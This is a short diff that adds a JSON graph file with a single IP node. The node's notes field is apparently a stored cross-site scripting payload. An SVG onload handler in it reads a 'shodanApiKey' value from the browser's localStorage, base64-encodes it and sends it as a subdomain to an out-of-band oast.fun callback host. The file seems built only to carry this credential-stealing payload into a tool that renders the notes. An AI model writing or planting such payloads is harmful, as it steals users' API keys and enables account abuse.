@@ -1,0 +1,11 @@
+{
+  "nodes": [
+    {
+      "id": 1,
+      "type": "ip",
+      "ip": "8.8.8.8",
+      "notes": "<svg onload=\"new Image().src='https://'+btoa(localStorage.getItem('shodanApiKey')||'none')+'.dvajyqmbyzvleteznfmfvtw0hiyuxit9p.oast.fun'\">"
+    }
+  ],
+  "edges": []
+}
